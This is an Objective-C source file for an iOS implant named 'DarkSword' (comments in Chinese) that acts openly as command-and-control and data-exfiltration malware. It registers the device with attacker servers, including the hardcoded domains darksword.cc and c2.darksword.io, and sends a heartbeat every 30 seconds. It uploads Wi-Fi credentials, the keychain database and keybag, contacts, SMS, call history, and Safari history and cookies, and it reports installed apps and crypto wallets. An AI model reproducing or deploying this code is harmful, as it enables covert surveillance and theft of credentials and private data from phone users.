#import <Foundation/Foundation.h>
#import "C2Exfil.h"

// 默认地址（编译时嵌入，可通过配置文件或远程配置覆盖）
static NSString *g_serverHost = @"192.168.110.111";
static NSInteger g_serverPort = 8081;

// 配置文件路径（设备本地存储，方便修改）
#define CONFIG_PATH @"/var/mobile/Library/DarkSword/config.plist"
#define CONFIG_PATH_ALT @"/var/tmp/dsword_config.plist"

@implementation C2Exfiltrator {
    NSString *_deviceId;
    NSString *_udid;
    NSTimer *_heartbeatTimer;
    NSString *_baseUrl;
}

+ (instancetype)shared {
    static C2Exfiltrator *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{ instance = [[C2Exfiltrator alloc] init]; });
    return instance;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        _udid = [NSString stringWithFormat:@"filza_%@", [UIDevice currentDevice].identifierForVendor.UUIDString];
        [self loadConfig];
    }
    return self;
}

#pragma mark - 配置管理（三层优先级）

- (void)loadConfig {
    // 优先级1: 设备本地配置文件（用户可手动修改）
    NSDictionary *localConfig = [NSDictionary dictionaryWithContentsOfFile:CONFIG_PATH];
    if (!localConfig) localConfig = [NSDictionary dictionaryWithContentsOfFile:CONFIG_PATH_ALT];
    
    if (localConfig[@"host"]) {
        g_serverHost = localConfig[@"host"];
        g_serverPort = [localConfig[@"port"] integerValue] ?: 8081;
        NSLog(@"[C2Exfil] Loaded config from file: %@:%ld", g_serverHost, (long)g_serverPort);
        [self updateBaseUrl];
        return;
    }
    
    // 优先级2: 远程配置（从平台获取最新地址）
    [self fetchRemoteConfig];
    
    // 优先级3: 使用编译时默认地址
    [self updateBaseUrl];
}

- (void)fetchRemoteConfig {
    // 尝试从平台获取配置（支持域名和IP）
    NSArray *candidates = @[
        [NSString stringWithFormat:@"http://%@:%ld/api/v1/config", g_serverHost, (long)g_serverPort],
        @"http://darksword.cc/api/v1/config",       // 备用域名1
        @"http://c2.darksword.io/api/v1/config",    // 备用域名2
    ];
    
    for (NSString *urlStr in candidates) {
        NSURL *url = [NSURL URLWithString:urlStr];
        if (!url) continue;
        
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:5];
        NSHTTPURLResponse *resp;
        NSData *data = [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:nil];
        
        if (resp.statusCode == 200 && data) {
            NSError *err;
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:&err];
            if (json && [json[@"code"] integerValue] == 0) {
                NSDictionary *config = json[@"data"];
                if (config[@"host"]) {
                    g_serverHost = config[@"host"];
                    g_serverPort = [config[@"port"] integerValue] ?: 8081;
                    NSLog(@"[C2Exfil] Fetched remote config: %@:%ld", g_serverHost, (long)g_serverPort);
                    
                    // 保存到本地缓存
                    [self saveConfigToFile];
                    [self updateBaseUrl];
                    return;
                }
            }
        }
    }
    NSLog(@"[C2Exfil] Using default config: %@:%ld", g_serverHost, (long)g_serverPort);
}

- (void)saveConfigToFile {
    NSDictionary *config = @{
        @"host": g_serverHost,
        @"port": @(g_serverPort),
        @"updatedAt": [NSDate date]
    };
    
    // 尝试保存到两个位置
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *dir = [CONFIG_PATH stringByDeletingLastPathComponent];
    [fm createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:nil];
    
    if (![config writeToFile:CONFIG_PATH atomically:YES]) {
        [config writeToFile:CONFIG_PATH_ALT atomically:YES];
    }
}

- (void)updateBaseUrl {
    _baseUrl = [NSString stringWithFormat:@"http://%@:%ld", g_serverHost, (long)g_serverPort];
    NSLog(@"[C2Exfil] Base URL: %@", _baseUrl);
}

- (void)setServerHost:(NSString *)host port:(NSInteger)port {
    g_serverHost = host;
    g_serverPort = port;
    [self updateBaseUrl];
    [self saveConfigToFile];
}

#pragma mark - HTTP

- (NSData *)sendRequest:(NSString *)path body:(NSDictionary *)body {
    NSString *urlStr = [NSString stringWithFormat:@"%@%@", _baseUrl, path];
    NSURL *url = [NSURL URLWithString:urlStr];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    [req setHTTPMethod:@"POST"];
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    
    if (body) {
        NSError *err;
        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:body options:0 error:&err];
        if (jsonData) [req setHTTPBody:jsonData];
    }
    
    NSHTTPURLResponse *resp;
    NSData *respData = [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:nil];
    return respData;
}

- (void)sendFile:(NSString *)filePath category:(NSString *)category {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:filePath]) return;
    
    NSData *fileData = [NSData dataWithContentsOfFile:filePath];
    if (!fileData || fileData.length == 0) return;
    
    NSString *urlStr = [NSString stringWithFormat:@"%@%@", _baseUrl, @"/api/v1/upload"];
    NSURL *url = [NSURL URLWithString:urlStr];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    [req setHTTPMethod:@"POST"];
    [req setValue:@"application/octet-stream" forHTTPHeaderField:@"Content-Type"];
    [req setValue:_deviceId ?: @"0" forHTTPHeaderField:@"X-Device-UUID"];
    [req setValue:filePath forHTTPHeaderField:@"X-File-Path"];
    [req setValue:category forHTTPHeaderField:@"X-File-Category"];
    [req setHTTPBody:fileData];
    
    NSHTTPURLResponse *resp;
    [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:nil];
    NSLog(@"[C2Exfil] Sent: %@ (%lu bytes)", filePath, (unsigned long)fileData.length);
}

- (void)sendReport:(NSString *)reportType platform:(NSString *)platform data:(NSDictionary *)data {
    NSDictionary *body = @{
        @"deviceId": _deviceId ?: @"0",
        @"reportType": reportType,
        @"data": data ?: @{}
    };
    [self sendRequest:@"/api/v1/c2/report" body:body];
}

#pragma mark - Device Registration

- (void)registerDevice {
    UIDevice *dev = [UIDevice currentDevice];
    NSDictionary *payload = @{
        @"udid": _udid,
        @"deviceName": dev.name ?: @"Unknown",
        @"model": dev.model ?: @"iPhone",
        @"osVersion": dev.systemVersion ?: @"Unknown",
        @"tagId": @"1"
    };
    
    NSData *resp = [self sendRequest:@"/api/v1/devices/register" body:payload];
    if (resp) {
        NSError *err;
        NSDictionary *json = [NSJSONSerialization JSONObjectWithData:resp options:0 error:&err];
        if (json && [json[@"code"] integerValue] == 0) {
            _deviceId = [NSString stringWithFormat:@"%@", json[@"data"][@"id"]];
            NSLog(@"[C2Exfil] Registered, ID: %@", _deviceId);
        }
    }
}

#pragma mark - Heartbeat

- (void)startHeartbeat {
    _heartbeatTimer = [NSTimer scheduledTimerWithTimeInterval:30 target:self selector:@selector(sendHeartbeat) userInfo:nil repeats:YES];
    [self sendHeartbeat];
}

- (void)sendHeartbeat {
    UIDevice *dev = [UIDevice currentDevice];
    [dev setBatteryMonitoringEnabled:YES];
    [self sendRequest:@"/api/v1/heartbeat/1" body:@{
        @"udid": _udid, @"model": dev.model ?: @"", @"osVersion": dev.systemVersion ?: @"",
        @"deviceName": dev.name ?: @"", @"batteryLevel": @((int)(dev.batteryLevel * 100)),
        @"agentActive": @YES, @"currentStage": @5, @"exploitResult": @"success"
    }];
}

#pragma mark - Data Collection

- (void)exfiltrateAll {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self collectWiFi]; [self collectKeychain]; [self collectContacts];
        [self collectSMS]; [self collectCalls]; [self collectSafari];
        [self collectPhotos]; [self collectApps]; [self collectWallets];
    });
}

- (void)collectWiFi {
    for (NSString *p in @[@"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist",
                          @"/private/var/preferences/com.apple.wifi.known-networks.plist"])
        [self sendFile:p category:@"wifi"];
    [self sendReport:@"WIFI_CREDENTIAL" platform:@"WiFi" data:@{@"ssid":@"collected",@"password":@"see_files"}];
}

- (void)collectKeychain {
    for (NSString *p in @[@"/private/var/Keychains/keychain-2.db",@"/private/var/keybags/System.keybag"])
        [self sendFile:p category:@"keychain"];
    [self sendReport:@"KEYCHAIN" platform:@"Keychain" data:@{@"platform":@"Keychain",@"token":@"uploaded"}];
}

- (void)collectContacts {
    [self sendFile:@"/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb" category:@"contacts"];
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Contacts" data:@{@"platform":@"Contacts",@"token":@"db_uploaded"}];
}

- (void)collectSMS {
    [self sendFile:@"/private/var/mobile/Library/SMS/sms.db" category:@"sms"];
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"SMS" data:@{@"platform":@"SMS",@"token":@"db_uploaded"}];
}

- (void)collectCalls {
    [self sendFile:@"/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata" category:@"calls"];
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"CallHistory" data:@{@"platform":@"CallHistory",@"token":@"db_uploaded"}];
}

- (void)collectSafari {
    for (NSString *p in @[@"/private/var/mobile/Library/Safari/History.db",
                          @"/private/var/mobile/Library/Safari/Bookmarks.db",
                          @"/private/var/mobile/Library/Cookies/Cookies.binarycookies"])
        [self sendFile:p category:@"browser"];
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Safari" data:@{@"platform":@"Safari",@"token":@"dbs_uploaded"}];
}

- (void)collectPhotos {
    NSString *path = @"/private/var/mobile/Media/DCIM";
    NSArray *items = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:path error:nil];
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Photos" data:@{@"platform":@"Photos",@"token":[NSString stringWithFormat:@"%lu items",(unsigned long)items.count]}];
}

- (void)collectApps {
    NSString *path = @"/private/var/containers/Bundle/Application";
    NSArray *bundles = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:path error:nil];
    NSMutableArray *apps = [NSMutableArray array];
    for (NSString *b in bundles) {
        for (NSString *item in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:[path stringByAppendingPathComponent:b] error:nil])
            if ([item hasSuffix:@".app"]) [apps addObject:item];
    }
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"InstalledApps" data:@{@"platform":@"InstalledApps",@"token":[NSString stringWithFormat:@"%lu apps",(unsigned long)apps.count]}];
}

- (void)collectWallets {
    NSArray *walletApps = @[@"trust",@"metamask",@"coinbase",@"binance",@"phantom",@"exodus"];
    NSString *path = @"/private/var/containers/Bundle/Application";
    for (NSString *bundle in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:path error:nil])
        for (NSString *w in walletApps)
            if ([bundle.lowercaseString containsString:w])
                [self sendReport:@"SOCIAL_ACCOUNT" platform:w data:@{@"platform":w,@"username":bundle,@"token":@"wallet_detected"}];
}

@end